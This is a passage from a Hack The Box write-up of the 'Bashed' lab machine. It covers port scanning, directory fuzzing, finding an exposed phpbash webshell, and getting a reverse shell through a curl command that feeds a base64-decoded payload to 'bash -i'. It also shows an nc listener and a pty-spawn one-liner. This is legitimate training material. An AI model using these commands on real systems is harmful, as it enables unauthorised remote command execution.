<!DOCTYPE html>
<html lang="en">
    <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
        <meta name="author" content="Matthieu Mezirard">
    
    <meta name="author" content="Matthieu Mezirard" />
    
        <meta name="description" content="This is an easy Linux box.">
    
    <title>
        
            
        
        root@mmezirard:~&#x2F;htb-write-ups&#x2F;boxes&#x2F;bashed#
    </title>
    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="stylesheet" type="text/css" href="/main.css" />
    <link
        id="theme-light-style"
        rel="stylesheet"
        type="text/css"
        href="/theme/light.css"
    />
    <link
        id="theme-dark-style"
        rel="stylesheet"
        type="text/css"
        href="/theme/dark.css"
    />
    <script
        async
        src="https://eu.umami.is/script.js"
        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
    ></script>
    <script src="/js/theme-toggle.js"></script>
    <script src="/js/code-wrapper.js"></script>
    <script src="/js/code-indicator.js"></script>
</head>


    <body>
        <header>
    <div class="left">
        <a href="/">
    mmezirard
</a>

        <div class="socials">
    
        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
            <img src="/icons/github.svg" alt="github" />
        </a>
    
        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
        </a>
    
        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
            <img src="/icons/hackerone.svg" alt="hackerone" />
        </a>
    
</div>

    </div>
    <div class="right">
        <nav>
    <ul>
        
            <li>
                <a href="&#x2F;htb-write-ups">
                    &#x2F;htb-write-ups
                </a>
            </li>
        
    </ul>
</nav>

        <button onclick="toggleTheme()">
    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
</button>
<script src="/js/theme-toggle.js"></script>

    </div>
</header>

        
    <main>
        
<article>
    <div>
        
    
        <div class="page-h1">
            Bashed<span>.</span>
        </div>
    


        <div class="page-metadata">
            
                Posted on <time>2024-01-25</time>
            
        </div>

        
            <img
                class="page-cover"
                alt="cover.png"
                src="https://mmezirard.github.io/htb-write-ups/boxes/bashed/cover.png"
            />
        
    </div>

    
        <h1>Table of Contents</h1>
        <ul>
            
                <li>
                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#information">Information</a>
                    
                </li>
            
                <li>
                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#setup">Setup</a>
                    
                </li>
            
                <li>
                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#host-10-10-10-68">Host 10.10.10.68</a>
                    
                        <ul>
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#scanning">Scanning</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#ports">Ports</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#fingerprinting">Fingerprinting</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#scripts">Scripts</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#services-enumeration">Services enumeration</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#apache">Apache</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#foothold-webshell">Foothold (Webshell)</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#preparation">Preparation</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#exploitation">Exploitation</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#spawning-a-pty">Spawning a pty</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#getting-a-lay-of-the-land">Getting a lay of the land</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#architecture">Architecture</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#distribution">Distribution</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#kernel">Kernel</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#users">Users</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#groups">Groups</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#nics">NICs</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#hostname">Hostname</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#system-enumeration">System enumeration</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#flags">Flags</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#website-code-review">Website code review</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#services-enumeration-1">Services enumeration</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#apache-1">Apache</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#system-enumeration-1">System enumeration</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#sudo-permissions">Sudo permissions</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#lateral-movement-sudo-permissions">Lateral movement (Sudo permissions)</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#exploitation-1">Exploitation</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#system-enumeration-2">System enumeration</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#exploring-scripts">Exploring &#x2F;scripts</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#privilege-escalation-sudo-permissions">Privilege escalation (Sudo permissions)</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#preparation-1">Preparation</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#exploitation-2">Exploitation</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#spawning-a-pty-1">Spawning a pty</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#system-enumeration-3">System enumeration</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#flags-1">Flags</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                        </ul>
                    
                </li>
            
                <li>
                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/bashed/#afterwords">Afterwords</a>
                    
                </li>
            
        </ul>
    

    <section><h1 id="information">Information</h1>
<p><strong>Difficulty</strong>: Easy</p>
<p><strong>OS</strong>: Linux</p>
<p><strong>Release date</strong>: 2017-12-09</p>
<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/2904">Arrexel</a></p>
<h1 id="setup">Setup</h1>
<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great
practice security-wise, but it's a VM so it's alright. This way I won't have to
prefix some commands with <code>sudo</code>, which gets cumbersome in the long run.</p>
<p>I like to maintain consistency in my workflow for every box, so before starting
with the actual pentest, I'll prepare a few things:</p>
<ol>
<li>
<p>I'll create a directory that will contain every file related to this box.
I'll call it <code>workspace</code>, and it will be located at the root of my filesystem
<code>/</code>.</p>
</li>
<li>
<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll use
<code>httpsimpleserver</code> to create an HTTP server on port <code>80</code> and
<code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make
files in this folder available over the Internet, which will be especially
useful for transferring files to the target machine if need be!</p>
</li>
<li>
<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory.
This will come in handy once we get a foothold, for privilege escalation and
for pivoting inside the internal network.</p>
</li>
</ol>
<p>I'll also strive to minimize the use of Metasploit, because it hides the
complexity of some exploits, and prefer a more manual approach when it's not too
much hassle. This way, I'll have a better understanding of the exploits I'm
running, and I'll have more control over what's happening on the machine.</p>
<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.4</code>. The
commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever
need to transfer files or binaries to the target machine, I'll always place them
in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
<p>Now we should be ready to go!</p>
<h1 id="host-10-10-10-68">Host <code>10.10.10.68</code></h1>
<h2 id="scanning">Scanning</h2>
<h3 id="ports">Ports</h3>
<p>As usual, let's start by initiating a port scan on Bashed using a TCP SYN <code>nmap</code>
scan to assess its attack surface.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.68<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">PORT   STATE SERVICE
</span><span class="z-text z-plain">80/tcp open  http
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<p>Let's also check the 500 most common UDP ports.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.68<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>top-ports</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>500<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<h3 id="fingerprinting">Fingerprinting</h3>
<p>Following the ports scans, let's gather more data about the service associated
with the open TCP port we found.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.68<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">PORT   STATE SERVICE VERSION
</span><span class="z-text z-plain">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<p>Alright, so the version of Apache suggests that Bashed might be running Ubuntu.</p>
<h3 id="scripts">Scripts</h3>
<p>Let's run <code>nmap</code>'s default scripts on the TCP service to see if they can find
additional information.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.68<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">PORT   STATE SERVICE
</span><span class="z-text z-plain">80/tcp open  http
</span><span class="z-text z-plain">|_http-title: Arrexel&#39;s Development Site
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<h2 id="services-enumeration">Services enumeration</h2>
<h3 id="apache">Apache</h3>
<h4 id="exploration">Exploration</h4>
<p>Let's browse to <code>http://10.10.10.68/</code>.</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/bashed/apache-homepage.png" alt="Apache homepage" /></p>
<p>This is a website that promotes the <code>phpbash</code> tool.</p>
<h4 id="fingerprinting-1">Fingerprinting</h4>
<p>Let's fingerprint the technologies used by this web page with the
<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/bashed/apache-homepage-wappalyzer.png" alt="Apache homepage Wappalyzer extension" /></p>
<h4 id="exploration-1">Exploration</h4>
<p>The only web page we have access to is <code>/single.html</code>:</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/bashed/apache-phpbash-page.png" alt="Apache phpbash page" /></p>
<p>This is an article about <code>phpbash</code>. The author claims that it 'helps a lot with
pentesting', and that 'it's very useful'. He also indicates that it has been
developed on this server... That's interesting! This also means that PHP is in
use.</p>
<p>The author provides a link to the
<a href="https://github.com/Arrexel/phpbash">GitHub source code</a>.</p>
<blockquote>
<p><code>phpbash</code> is a standalone, semi-interactive web shell. Its main purpose is to
assist in penetration tests where traditional reverse shells are not possible.
The design is based on the default Kali Linux terminal colors, so pentesters
should feel right at home.</p>
<p>— <a href="https://github.com/Arrexel/phpbash">GitHub</a></p>
</blockquote>
<p>Therefore, we understand that a webshell is present on the server. We'll have to
find it!</p>
<h4 id="directory-fuzzing">Directory fuzzing</h4>
<p>Let's see if we can locate this webshell.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ffuf<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>c</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://10.10.10.68/FUZZ<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>w</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>mc</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>100-403,405-599<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>e</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/,.php<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">[Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 28ms]
</span><span class="z-text z-plain">| URL | http://10.10.10.68/images
</span><span class="z-text z-plain">| --&gt; | http://10.10.10.68/images/
</span><span class="z-text z-plain">    * FUZZ: images
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[Status: 200, Size: 1564, Words: 91, Lines: 20, Duration: 28ms]
</span><span class="z-text z-plain">| URL | http://10.10.10.68/images/
</span><span class="z-text z-plain">    * FUZZ: images/
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[Status: 403, Size: 292, Words: 22, Lines: 12, Duration: 25ms]
</span><span class="z-text z-plain">| URL | http://10.10.10.68/icons/
</span><span class="z-text z-plain">    * FUZZ: icons/
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 24ms]
</span><span class="z-text z-plain">| URL | http://10.10.10.68/uploads
</span><span class="z-text z-plain">| --&gt; | http://10.10.10.68/uploads/
</span><span class="z-text z-plain">    * FUZZ: uploads
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[Status: 200, Size: 14, Words: 1, Lines: 2, Duration: 23ms]
</span><span class="z-text z-plain">| URL | http://10.10.10.68/uploads/
</span><span class="z-text z-plain">    * FUZZ: uploads/
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 25ms]
</span><span class="z-text z-plain">| URL | http://10.10.10.68/php
</span><span class="z-text z-plain">| --&gt; | http://10.10.10.68/php/
</span><span class="z-text z-plain">    * FUZZ: php
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[Status: 200, Size: 939, Words: 64, Lines: 17, Duration: 26ms]
</span><span class="z-text z-plain">| URL | http://10.10.10.68/php/
</span><span class="z-text z-plain">    * FUZZ: php/
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 25ms]
</span><span class="z-text z-plain">| URL | http://10.10.10.68/css
</span><span class="z-text z-plain">| --&gt; | http://10.10.10.68/css/
</span><span class="z-text z-plain">    * FUZZ: css
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[Status: 200, Size: 1758, Words: 99, Lines: 21, Duration: 25ms]
</span><span class="z-text z-plain">| URL | http://10.10.10.68/css/
</span><span class="z-text z-plain">    * FUZZ: css/
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 27ms]
</span><span class="z-text z-plain">| URL | http://10.10.10.68/dev
</span><span class="z-text z-plain">| --&gt; | http://10.10.10.68/dev/
</span><span class="z-text z-plain">    * FUZZ: dev
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[Status: 200, Size: 1148, Words: 76, Lines: 18, Duration: 27ms]
</span><span class="z-text z-plain">| URL | http://10.10.10.68/dev/
</span><span class="z-text z-plain">    * FUZZ: dev/
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[Status: 200, Size: 3165, Words: 190, Lines: 27, Duration: 25ms]
</span><span class="z-text z-plain">| URL | http://10.10.10.68/js/
</span><span class="z-text z-plain">    * FUZZ: js/
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 26ms]
</span><span class="z-text z-plain">| URL | http://10.10.10.68/js
</span><span class="z-text z-plain">| --&gt; | http://10.10.10.68/js/
</span><span class="z-text z-plain">    * FUZZ: js
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 33ms]
</span><span class="z-text z-plain">| URL | http://10.10.10.68/config.php
</span><span class="z-text z-plain">    * FUZZ: config.php
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 25ms]
</span><span class="z-text z-plain">| URL | http://10.10.10.68/fonts
</span><span class="z-text z-plain">| --&gt; | http://10.10.10.68/fonts/
</span><span class="z-text z-plain">    * FUZZ: fonts
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[Status: 200, Size: 2095, Words: 124, Lines: 22, Duration: 26ms]
</span><span class="z-text z-plain">| URL | http://10.10.10.68/fonts/
</span><span class="z-text z-plain">    * FUZZ: fonts/
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 25ms]
</span><span class="z-text z-plain">| URL | http://10.10.10.68/
</span><span class="z-text z-plain">    * FUZZ: 
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 48ms]
</span><span class="z-text z-plain">| URL | http://10.10.10.68//
</span><span class="z-text z-plain">    * FUZZ: /
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 48ms]
</span><span class="z-text z-plain">| URL | http://10.10.10.68/.php
</span><span class="z-text z-plain">    * FUZZ: .php
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 27ms]
</span><span class="z-text z-plain">| URL | http://10.10.10.68/server-status
</span><span class="z-text z-plain">    * FUZZ: server-status
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 28ms]
</span><span class="z-text z-plain">| URL | http://10.10.10.68/server-status/
</span><span class="z-text z-plain">    * FUZZ: server-status/
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<p>The <code>/config.php</code> file is likely included in a PHP page, but it's not what we're
looking for.</p>
<p>My first idea was to check <code>/uploads/</code>, but I found nothing. However, the author
of this website said that <code>phpbash</code> has been 'developed' on this server... As if
if by chance, there's a <code>/dev/</code> folder! Let's browse to it.</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/bashed/apache-dev-folder.png" alt="Apache dev folder" /></p>
<p>Luckily, file listing is enabled. We see that the <code>phpbash</code> files are present,
and haven't been renamed! Let's browse to any of them.</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/bashed/apache-phpbash-webshell.png" alt="Apache phpbash webshell" /></p>
<p>Here it is!</p>
<h2 id="foothold-webshell">Foothold (Webshell)</h2>
<p>Webshells are great, but I prefer reverse shells.</p>
<h3 id="preparation">Preparation</h3>
<p>First, I'll setup a listener to receive the shell.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>9001<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<p>Then, I'll choose the Base64 encoded version of the 'Bash -i' payload from
<a href="https://www.revshells.com/">RevShells</a> configured to obtain a <code>/bin/bash</code>
shell.</p>
<p>I'll save it as the <code>BASE64_REVSHELL_PAYLOAD</code> shell variable.</p>
<h3 id="exploitation">Exploitation</h3>
<p>Now let's use our webshell to execute our reverse shell payload.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/dev/null<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://10.10.10.68/dev/phpbash.php<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>X</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>POST<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>cmd=/bin/echo <span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">BASE64_REVSHELL_PAYLOAD</span></span> | /usr/bin/base64 -d | /bin/bash -i<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<p>If we check our listener:</p>
<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.4] from (UNKNOWN) [10.10.10.68] 39624
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">www-data@bashed:/var/www/html/dev$
</span></code></pre>
<p>It caught the reverse shell!</p>
<h3 id="spawning-a-pty">Spawning a pty</h3>
<p>Let's use this one-liner to spawn a pty:</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">python3</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>c</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>import pty; pty.spawn(&quot;/bin/bash&quot;)<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span>
</span></code></pre>
<h2 id="getting-a-lay-of-the-land">Getting a lay of the land</h2>
<p>If we run <code>whoami</code>, we see that we got a foothold as <code>www-data</code>.</p>
<h3 id="architecture">Architecture</h3>
<p>What is Bashed's architecture?</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@bashed:/var/www/html/dev$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">x86_64
</span></code></pre>
<p>It's using x86_64. Let's keep that in mind to select the appropriate binaries.</p>
<h3 id="distribution">Distribution</h3>
<p>Let's see which distribution Bashed is using.</p>
